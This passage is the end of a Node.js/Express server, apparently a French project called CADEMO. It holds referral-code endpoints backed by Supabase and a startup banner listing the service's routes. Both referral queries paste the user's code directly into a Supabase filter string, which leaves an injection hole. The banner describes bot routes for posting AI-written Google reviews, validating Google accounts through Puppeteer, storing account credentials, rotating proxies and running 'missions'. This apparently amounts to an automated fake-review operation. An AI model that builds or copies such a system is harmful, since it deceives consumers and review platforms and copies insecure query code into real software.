app.get('/api/referral/validate-code', async (req, res) => {
  const { code } = req.query;
  if (!code) return res.status(400).json({ success: false, error: 'Code requis' });
  try {
    const cleanCode = code.trim();
    const { data: rows, error } = await supabase.from('users')
      .select('id, affiliate_code, short_id')
      .eq('role', 'partner')
      .or(`affiliate_code.eq.${cleanCode},short_id.eq.${cleanCode}`)
      .limit(1);
    const data = (rows && rows[0]) || null;
    if (error) {
      console.error('[REFERRAL] Erreur Supabase:', error);
      return res.status(500).json({ success: false, error: error.message });
    }
    if (!data) return res.json({ success: false, error: 'Code invalide' });
    return res.json({ success: true, affiliateId: data.id, username: data.affiliate_code || data.short_id });
  } catch (err) {
    console.error('[REFERRAL] Erreur:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/** POST /api/referral/link-referral — enregistre un parrainage côté Supabase */
app.post('/api/referral/link-referral', async (req, res) => {
  const { userId, email, referralCode } = req.body;
  if (!userId || !email || !referralCode) {
    return res.status(400).json({ success: false, error: 'userId, email et referralCode requis.' });
  }
  try {
    const cleanEmail = email.toLowerCase().trim();
    const cleanCode = referralCode.trim();

    // Vérifie que l'affilié existe
    let { data: affRows } = await supabase.from('users')
      .select('id, affiliate_code, short_id')
      .eq('role', 'partner')
      .or(`affiliate_code.eq.${cleanCode},short_id.eq.${cleanCode}`)
      .limit(1);
    const affiliate = (affRows && affRows[0]) || null;
    if (!affiliate) {
      return res.status(400).json({ success: false, error: 'Code affilié introuvable.' });
    }

    // S'assure que le joueur existe dans la table users
    const { data: existingRows } = await supabase.from('users').select('*').eq('id', userId).limit(1);
    const existing = (existingRows && existingRows[0]) || null;
    if (!existing) {
      const shortId = await generateUniqueShortId();
      const { error: insertErr } = await supabase.from('users').insert({
        id: userId,
        email: cleanEmail,
        short_id: shortId,
        role: 'player',
        referred_by: cleanCode,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      });
      if (insertErr) throw insertErr;
    } else if (!existing.referred_by) {
      const { error: updErr } = await supabase.from('users')
        .update({ referred_by: cleanCode, updated_at: new Date().toISOString() })
        .eq('id', userId);
      if (updErr) {
        console.error('[REFERRAL-LINK] Erreur update referred_by :', updErr);
      }
    }

    // Crée le lien dans referrals (idempotent)
    const linkResult = await linkReferralByCode(userId, cleanCode);
    if (!linkResult || linkResult.error) {
      console.error('[REFERRAL-LINK] linkReferralByCode a échoué :', linkResult?.error);
      return res.status(400).json({ success: false, error: linkResult?.error || 'Erreur lors de l\'enregistrement du parrainage.' });
    }

    return res.json({ success: true, message: 'Parrainage enregistré dans Supabase.', affiliateId: linkResult.affiliateId });
  } catch (err) {
    console.error('[REFERRAL-LINK] Erreur:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

require('./admin-routes')(app, supabase, getBotStatus);

app.use('/api/oauth', require('./api/oauth-google').router);

startBotEngine();

app.listen(PORT, () => {
  console.log('===========================================');
  console.log('  CADEMO - AGENT DE VALIDATION AUTOMATISE');
  console.log('===========================================');
  console.log('  Serveur: http://localhost:' + PORT);
  console.log('  ADMIN_PASSWORD:', process.env.ADMIN_PASSWORD ? '**** (configured)' : 'NOT CONFIGURED — ajoutez ADMIN_PASSWORD=votre_mot_de_passe dans .env et redémarrez le serveur');
  console.log('');
  console.log('  Endpoints:');
  console.log('  POST /api/validate-account/:userId       - Valider compte Google (Puppeteer)');
  console.log('  POST /api/validate-account-now/:userId   - Validation immédiate (Puppeteer)');
  console.log('  POST /api/verify-email-python            - Valider via script Python (prod)');
  console.log('  POST /api/setup-credentials              - Lier un compte Google (configuration)');
  console.log('  GET  /api/validation-status/:userId      - Statut validation');
  console.log('  GET  /api/worker-stats                   - Stats worker');
  console.log('  POST /api/post-review/:userId            - Poster avis Google (IA)');
  console.log('');
  console.log('  AFFILIATION:');
  console.log('  POST /api/affiliate/setup                - Setup profil affilié');
  console.log('  GET  /api/affiliate/me                   - Profil affilié');
  console.log('  POST /api/affiliate/search               - Recherche joueur #XXXX');
  console.log('  POST /api/affiliate/activate-bonus       - Activer bonus 200€');
  console.log('  GET  /api/affiliate/stats                - Stats & commissions');
  console.log('  GET  /api/affiliate/referrals            - Liste des filleuls');
  console.log('  GET  /api/player/me                      - Profil joueur (wager inclus)');
  console.log('');
  console.log('  ADMIN BOT/IA:');
  console.log('  GET  /api/admin/bot-status               - Statut bot engine');
  console.log('  GET  /api/admin/proxies                  - Liste proxies');
  console.log('  POST /api/admin/proxies                  - Ajouter proxy');
  console.log('  GET  /api/admin/accounts                 - Liste comptes');
  console.log('  POST /api/admin/sync-accounts            - Importer users actifs');
  console.log('  GET  /api/admin/missions                 - Liste missions');
  console.log('  POST /api/admin/missions                 - Créer mission');
  console.log('  GET  /api/admin/login-logs               - Sessions de connexion (NEW)');
  console.log('  GET  /api/admin/login-stats              - Stats connexions (NEW)');
  console.log('  GET  /api/admin/login-logs/:email        - Sessions par email (NEW)');
  console.log('');
  console.log('  OAUTH GOOGLE:');
  console.log('  GET  /api/oauth/auth                - Démarrer auth Google (email+userId)');
  console.log('  GET  /api/oauth/continue            - Continuer après confirmation');
  console.log('  GET  /api/oauth/callback            - Callback Google OAuth');
  console.log('');
  console.log('  ⚠️  NECESSITE:');
  console.log('  1. SUPABASE_SERVICE_ROLE_KEY dans .env');
  console.log('  2. Tables users, referrals, affiliate_commissions');
  console.log('  3. PROXY_POOL dans worker/proxy-rotator.js');
  console.log('  4. Puppeteer installé (Chrome requis)');
  console.log('===========================================');
});
